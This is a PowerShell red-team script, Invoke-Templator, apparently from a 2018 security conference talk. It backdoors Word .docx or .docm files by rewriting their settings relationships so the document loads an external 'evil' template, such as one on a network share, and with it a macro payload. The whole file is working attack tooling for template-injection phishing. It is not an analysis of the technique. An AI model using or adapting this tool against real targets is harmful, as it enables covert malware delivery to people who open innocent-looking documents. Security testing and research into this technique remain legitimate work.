<#
    Invoke-Templator.ps1
    Author: Pieter Ceelen (@PtrPieter) / Stan Hegt (@StanHacked)
    License: BSD 3-Clause

    Goal: Update Template location in Word files so we can mess around with macro payloads. 
    Presented at the MS office magic show @Derbycon 2018, additional details on https://www.outflank.nl/blog
#>

function Invoke-Unzip 
{
  [CmdletBinding()]
    param([string]$FileName,[string]$TempDir )

    Add-Type -Assembly "system.io.compression.filesystem"

    [io.compression.zipfile]::ExtractToDirectory($filename, $tempdir)
}

function Invoke-Zip
{
 [CmdletBinding()]
    param([string]$FileName,[string]$Dir )

    Add-Type -Assembly "system.io.compression.filesystem"

    [io.compression.zipfile]::CreateFromDirectory($Dir, $FileName)

}

function Invoke-Templator 
{
<#
.SYNOPSIS
Update Template location in Word files so we can mess around with macro payloads.
.DESCRIPTION
Presented at the MS office magic show @Derbycon 2018, additional details on https://www.outflank.nl/blog
Author: Pieter Ceelen (@PtrPieter) / Stan Hegt (@StanHacked)
.PARAMETER docFile
The .docx or .docm file to backdoor
.PARAMETER templateFile
Full path of evil template.
.EXAMPLE
PS > Invoke-Templator -docFile c:\temp\innocent.docx -templateFile "\\server\share name\evil.dot"
This will set evil.dot as a default template for the file innocent.docx.
.LINK
https://www.outflank.nl
.NOTES
None
#>
    [CmdletBinding()] Param(
              [Parameter(Mandatory=$True)] [String] $templateFile,
              [Parameter(Mandatory=$True)] [String] $docFile,
              [String] $tempPath = $env:TEMP
        )
 
    $rnd=Get-Random

    $newdir = New-Item -Path $tempPath -ItemType "directory" -Name $rnd

    if (!(Test-Path $docFile)) {
		Write-Host "unable to find file $docFile"
		exit
    }

    $ext=$docFile.split(".")[-1]
    if($ext -notin "docm","docx") {
		Write-Host "please provide a docm or docx as input docFile, not an $ext" 
		exit
    }

    Invoke-Unzip -FileName $docFile -TempDir "$tempPath\$rnd"  
    $xmlfile = "$tempPath\$rnd\word\_rels\settings.xml.rels"

    if ((Test-Path $xmlfile)) {
        Write-verbose "xmlfile does exist"

        [xml]$xmldata = get-content $xmlfile
        $curTemplate = $xmldata.Relationships.Relationship.Attributes['Target'].Value
        Write-Host "File $docFile already has an template attached, updating"
         $xmldata.Relationships.Relationship.Attributes['Target'].'#text'="file:///$templateFile"
         $xmldata.save( $xmlfile)
    } else {
        Write-Verbose "xmlfile is not found, creating a new one in $xmlfile"
        [xml]$xmldata = '<?xml version="1.0" encoding="UTF-8" standalone="yes"?> <Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="file:///F:\pieterisdebeste.dot" TargetMode="External"/></Relationships>'
        $xmldata.Relationships.Relationship.Attributes['Target'].'#text'="file:///$templateFile"
        $xmldata.save( $xmlfile)

        Write-Verbose "xmlfile was not found, adding a reference to our template in word\settings.xml"
        [xml]$settingsdoc = gc "$tempPath\$rnd\word\settings.xml"
        $child = $settingsdoc.CreateElement("w","attachedTemplate","http://schemas.openxmlformats.org/wordprocessingml/2006/main")
        $atr = $settingsdoc.CreateAttribute("r","id","http://schemas.openxmlformats.org/officeDocument/2006/relationships")

        $atr.value = "rId1"|Out-Null
        $child.Attributes.Append($atr)|Out-Null
        $settingsdoc.settings.appendChild($child)|Out-Null
        $settingsdoc.save("$tempPath\$rnd\word\settings.xml")
    }

    Invoke-Zip -Dir "$tempPath\$rnd\" -FileName "$tempPath\$rnd.$ext"

	$baseName = [System.IO.Path]::GetFileNameWithoutExtension($docFile)
	Copy-Item -Path "$tempPath\$rnd.$ext" -Destination "$baseName-$rnd.$ext"
    Write-Host "Created file $baseName-$rnd.$ext"

    Remove-Item -Path "$tempPath\$rnd\" -Recurse
}
